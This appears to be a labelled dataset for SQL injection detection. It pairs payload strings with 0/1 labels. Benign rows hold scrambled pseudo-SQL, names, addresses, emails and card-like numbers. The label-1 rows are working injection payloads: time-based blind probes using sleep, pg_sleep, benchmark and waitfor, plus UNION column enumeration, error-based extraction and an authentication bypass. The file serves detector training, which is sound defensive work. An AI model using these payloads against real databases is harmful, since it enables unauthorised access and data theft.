payload	label
88253687l	0
nelber	0
   SELECT COUNT ( ear ) , line FROM curious BY center	0
SELECT * FROM arrangement WHERE return BETWEEN certain09/01/1996four AND chart15/31/1996party	0
1 and   (  5369  =  8325  )  *8325# psze	1
3556610000000000	0
fina	0
INSERT INTO belong ( route, collect, desert, bowl, smooth, threw )  VALUES  ( 'spread', 'weigh'. forty', 'fear', 'loss', 'apartment', 'studied' )  	0
SELECT two ( s )  FROM toward	0
select sleep  (  5  )  -- waln	1
9867	0
413f1go	0
7905890000000000	0
globula*riceo	0
SELECT * FROM square WHERE aside NOT LIKE '[strange]%'	0
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #	1
  SELECT coat,fought,cost FROM avoid LEFT JOIN Orders ON men.marriedID =  exchange.were ORDER BY finest.recognize	0
SELECT DISTINCT claws FROM gentle	0
  SELECT apple AS present, think AS [fifth]  FROM at	0
"-8838""   )    )    as xisn where 2749  =  2749 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --"	1
"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055"	1
11106027v	0
SELECT COUNT ( DISTINCT larger )  FROM spite	0
select * from information_schema.tables--	1
SELECT * FROM mirror 3 SELECT * FROM pleasant	0
SELECT * FROM  ( SELECT shallow FROM drive ) 	0
32621	0
SELECT AVG ( accurate ) FROM keep SELECT SUM ( knife ) 	0
1'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'niro'  =  'niro	1
1%'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --	1
urbanitzacio las lomas, 18, 4a	0
1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --	1
SELECT * FROM previous WHERE six = 'got' FETCH FIRST 3 ROWS ONLY	0
   SELECT tank, power, down FROM hour WHERE secret  IS NULL	0
riego	0
pierre-y	0
pr99o9a9	0
1%'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  '%'  =  '	1
1  )   as ptxw where 9873  =  9873	1
"1"" where 4073  =  4073 rlike   (  select   (  case when   (  8716  =  4281  )   then 1 else 0x28 end   )    )   --"	1
SELECT COUNT ( special ) FROM west	0
fedor	0
SELECT TOP 3 * FROM between WHERE flame = 'what' SELECT * FROM newspaper	0
"1%""  )   union all select null,null,null--"	1
SELECT AVG ( farm )  FROM stone  SELECT SUM ( instant ) 	0
1%'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '	1
1'   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'mmow'  =  'mmow	1
1'||  (  select 'bpml' where 7360  =  7360 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'	1
SELECT TOP 3 * FROM growth SELECT * FROM catch 3SELECT * FROM mainly	0
ramblizo	0
SELECT * FROM dozen WHERE verb NOT LIKE 'clothing%'	0
SELECT * FROM hair WHERE Price NOT BETWEEN 10 AND 20	0
-5160'  )   as kgjw where 9609  =  9609 union all select 9609,9609--	1
-1064' or make_set  (  6439  =  2937,2937  )   and 'qojd'  =  'qojd	1
SELECT hospital FROM why	0
SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_6102e48f912f6' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1	0
SELECT * FROM support WHERE race = 'needle'  OR important = 'produce'	0
-6642'  )   where 3459  =  3459 union all select 3459,3459,3459,3459,3459,3459,3459,3459,3459#	1
1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'ujcx'  =  'ujcx	1
voglis@hiperxxx.au	0
"waitfor delay '0:0:5' and    (    (     (  ""%""  =  """	1
SELECT dark ( s )  FROM read SELECT charge FROM cabin	0
SELECT Count ( * )  AS consonant	0
 select * from users where id  =  '1' <@._ union select 1,version  (    )   -- 1'	1
1   )    )    and 3249  =  2985	1
-3059'  )   as jhbh where 4056  =  4056 or   (  3498  =  6965  )  *6965--	1
1 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  -- zimf	1
SELECT whom ( s ) FROM subject INNER JOIN	0
1'+  (  select yjtm where 3965  =  3965 and 9389  =  3443	1
1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#	1
1  )   as caoa where 6139  =  6139 union all select null,null,null,null,null,null,null,null--	1
  SELECT Orders.shoutrID, Employees.twenty, Employees.be FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.settleID ORDER BY Orders.governmentID	0
  SELECT mix,iron FROM least WHERE rear = 'terrible' UNION SELECT railroad, everybody FROM is	0
jamaly	0
1%'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  '%'  =  '	1
canut escriba	0
-8378%'  )   union all select 5491#	1
"""   )    )    or pg_sleep  (  __TIME__  )  --"	1
lohr@show.nom.ad	0
   SELECT cold,white,alone,frozen,new     (  (  room JOIN science ON today.somehow =  dark.specific )   INNER JOIN bushON Orders.wire =  church.whistleID ) 	0
hiromi	0
"1""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --"	1
 select * from users where id  =  1 <@. union select 1,version  (    )   -- 1	1
almansa ingls	0
"1"" where 4672  =  4672"	1
mortensen@look2fly.nr	0
SELECT * FROM read WHERE breathe = 'thus' FETCH FIRST 3 ROWS ONLY	0
1 where 7055  =  7055	1
bjorn	0
SELECT around ( s FROM former RIGHT JOIN	0
  SELECT be AS up, solution AS [political]  FROM seed	0
calle manuel de falla, 65 5?a	0
  SELECT * FROM drove WHERE dark NOT IN  ( 'younger', 'swung', 'term' )  	0
marracos	0
SELECT * FROM shake ORDER BY jar DESC	0
488546000000000	0
   SELECT Employees.aside, COUNT ( Orders.governmentID )  AS thickFROM    ( OrdersINNER JOIN cheese ON Orders.steadyID  =  Employees.happenedID ) 	0
plza. almudaina s/n	0
  SELECT thank AS dried, studied AS [refused]  FROM land	0
SELECT * FROM safe WHERE active = 'plural' LIMIT 3	0
 select * from users where id  =  1 union select 1<@,version  (    )   -- 1	1
SELECT * FROM general WHERE easy  BETWEEN 10 AND 20	0
-2424  )   where 8132  =  8132 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --	1
SELECT * FROM  ( SELECT black FROM of ) 	0
-8266%'  )   union all select 8626,8626,8626,8626,8626,8626--	1
SELECT butter ( s FROM neck RIGHT JOIN	0
-4480'  )   where 4661  =  4661 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --	1
1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #	1
4676150000000000	0
-7584' union all select 1132,1132,1132,1132,1132,1132,1132,1132,1132,1132#	1
"1"" and 7533  =  7533 and ""dqjp""  =  ""dqjp"	1
SELECT * FROM bottom WHERE fully BETWEEN '1996-07-01' AND '1996-07-31'	0
me73ga	0
SELECT TOP 50 PERCENT * FROM take SELECT * FROM result FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM law	0
me93a	0
"1%""   )    )     )   and 7533  =  7533 and    (    (     (  ""%""  =  """	1
SELECT TOP 3 * FROM fifty SELECT * FROM physical 3SELECT * FROM rays	0
SELECT * FROM end FETCH FIRST 50 PERCENT ROWS ONLY	0
15142	0
  SELECT MAKEDATE ( 2017, 366 ) ;	0
livermore-kozlowski@hiteurope.ws	0
declare @s varchar   (  8000  )   select @s   =   0x73656c ...	1
17536	0
50269	0
"1""   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   ""umfr"" like ""umfr"	1
3572860000000000	0
 select * from users where id  =  1 or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1	1
1'   )    )    as joco where 2922  =  2922	1
hildebaldo	0
"1""  )   where 1673  =  1673 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --"	1
51517640d	0
SELECT TOP 3 * FROM actual SELECT * FROM moving 3SELECT * FROM plate	0
SELECT AVG ( thought ) FROM forget SELECT SUM ( cutting ) 	0
  SELECT * FROM brush WHERE surrounded NOT IN  ( 'log', 'form', 'every' )  	0
1 union all select null,null,null,null--	1
7311	0
6087	0
  SELECT * FROM five WHERE dirty IN  ( 'village', 'plane', 'industry' )  	0
SELECT AVG ( correctly ) FROM usually SELECT SUM ( shoot ) 	0
-2009%' union all select 1991,1991#	1
SELECT * FROM language WHERE circus NOT LIKE '[declared]%'	0
SELECT offer FROM go	0
   SELECT include, voice, ate FROM please WHERE can  IS NULL	0
SELECT * FROM telephone	0
"1""  )   as dien where 4022  =  4022"	1
SELECT * FROM slight WHERE    NOT tales = 'arrive'	0
1 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  -- ixlk	1
SELECT * FROM type WHERE thirty = 'air'  OR proud = 'dog'	0
-5021'+  (  select yadq where 4285  =  4285 order by 1#	1
1 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --	1
1'+  (  select iaeu where 5509  =  5509 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #	1
bardallur	0
74725623a	0
admin' or '1'  =  '1	1
huesca	0
-5852  )   as anca where 3574  =  3574 or 3958  =  5536#	1
select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'qomf' like 'qomf	1
"  SELECT SUBSTR ( ""SQL Tutorial"", -5, 5 )  AS ExtractString;"	0
select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'nlrk' like 'nlrk	1
1   )    )    as klmm where 3107  =  3107	1
SELECT loose FROM stretch UNION ALL SELECT buffalo FROM column ORDER BY leader	0
1'||  (  select 'ezse' from dual where 3821  =  3821	1
"1%""  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  ""%""  =  """	1
granados 151,	0
  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6130  =  6130,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  	1
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 347682 )  ORDER BY meta_id ASC	0
SELECT * FROM fall WHERE NOT attention = 'our'  AND NOT bad = 'plan'	0
ezri	0
"1""  )   as eomu where 6599  =  6599"	1
SELECT * FROM read WHERE slightly = 'remember' FETCH FIRST 3 ROWS ONLY	0
"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""tpxo"" like ""tpxo"	1
rumsey@ubikuo.coop	0
   SELECT support, our+ ', ' + political+ ' ' + fierce+ ', ' + shallow AS far  FROM again	0
SELECT TOP 3 * FROM stood SELECT * FROM brick 3SELECT * FROM crack	0
SELECT * FROM every WHERE crew BETWEEN '1996-07-01' AND '1996-07-31'	0
""" or sleep  (  __TIME__  )  #"	1
jaln de cameros	0
select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  'qvoy'  =  'qvoy	1
SELECT * FROM clear WHERE pig IN  ( SELECT discovery FROM north ) 	0
47gent1r	0
-8264%'  )   order by 1#	1
quintana 19, 13f	0
-9821  )   as qqrm where 7152  =  7152 union all select 7152,7152,7152,7152--	1
1   )    )    and   (  4169  =  9887  )  *9887 and    (    (   1137  =  1137	1
crcova valentini	0
  SELECT asleep,hat FROM vast WHERE typical = 'his' UNION SELECT using, whenever FROM meal	0
SELECT * FROM poem WHERE NOT donkey = 'heading'  AND NOT salmon = 'everywhere'	0
4376	0
SELECT adventure FROM farm	0
1 and elt  (  4249  =  4249,7259  )  	1
5986	0
SELECT AVG ( nose ) FROM lower	0
"1""  )   as idwa where 2545  =  2545 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --"	1
SELECT * FROM off WHERE motion = 'no'	0
SELECT * FROM thread WHERE strong NOT LIKE 'any%'	0
SELECT * FROM feathers	0
belmonte de gracin	0
 SELECT column_name ( s )  FROM location,arrangement	0
SELECT AVG ( beginning ) FROM lower SELECT SUM ( exchange ) 	0
yeladaky janeiro	0
SELECT thou ( s FROM together RIGHT JOIN	0
43877	0
SELECT * FROM arm WHERE cold = 'balance'	0
SELECT * FROM herself  WHERE wagon NOT LIKE '[fallen]%'	0
SELECT * FROM than WHERE peace = 'care' LIMIT 3	0
1'   )    )    as ewsw where 4667  =  4667 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #	1
"1""   )    )    as yfpl where 4820  =  4820 union all select null,null,null,null,null,null,null--"	1
SELECT * FROM actually FETCH FIRST 50 PERCENT ROWS ONLY	0
8720000000000001	0
sureda bahamonde	0
"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """	1
3423	0
1%'   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   '%'  =  '	1
1'  )   union all select null,null,null,null,null,null,null,null,null#	1
SELECT * FROM ahead FETCH FIRST 50 PERCENT ROWS ONLY	0
SELECT pass FROM rise	0
conejo mota	0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""ekbq""  =  ""ekbq"	1
1  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  6690  =  6690	1
SELECT * FROM brief  WHERE cookies NOT LIKE '[well]%'	0
SELECT recall ( s )  FROM near SELECT yard ( s ) 	0
1'||  (  select 'fpfl' from dual where 1434  =  1434 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'	1
"1%""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""%""  =  """	1
  SELECT * FROM string WHERE stranger NOT IN  ( 'swim', 'art', 'arrive' )  	0
ns	1
1'+  (  select wjpc where 5943  =  5943 and make_set  (  8403  =  8403,8899   )    )   +'	1
1   )    )    as bjxd where 4299  =  4299	1
22193	0
"-1908""   )    )    union all select 4072,4072,4072,4072,4072,4072,4072,4072,4072,4072#"	1
" select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1"	1
"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --"	1
sliter	0
SELECT ProductName, UnitPrice *  ( UnitsInStock + IFNULL ( UnitsOnOrder, 0  )  )   FROM Products;	0
1'  )   as ibaw where 2130  =  2130 and 9198  =  9198--	1
SELECT option_value FROM wp_options WHERE option_name  =  'acf_pro_license' LIMIT 1	0
"1%"" union all select null,null,null,null--"	1
SELECT * FROM daughter FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM younger	0
carstens	0
1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null#	1
fischetti.bacall@players.com.gr	0
SELECT COUNT ( roomID ) FROM tobacco	0
SELECT MIN ( produce )  AS boy FROM donkey	0
-9553   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   5299  =  5299	1
SELECT down ( s )  FROM drove UNION	0
ajoy	0
sarri de ter	0
69054908f	0
mandayona	0
-4873'   )    )     )   or 3038  =  3038	1
  SELECT * FROM tell WHERE your IN  ( 'faster', 'on', 'are' )  	0
SELECT Count ( * )  AS whether	0
-8833'   )    )    union all select 3227,3227,3227,3227,3227--	1
SELECT AVG ( plus )  FROM dirt  SELECT SUM ( dropped ) 	0
SELECT flew FROM couple UNION ALL SELECT wrapped FROM turn ORDER BY yesterday	0
select   (  case when   (  8716  =  1338  )   then 1 else 8716*  (  select 8716 from master..sysdatabases  )   end  )  --	1
"-5509%""   )    )     )   union all select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--"	1
1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --	1
SELECT yes FROM widely UNION ALL SELECT if FROM independent ORDER BY native	0
1 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  # miji	1
cluet higuerue	0
"-1678"" where 3706  =  3706 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --"	1
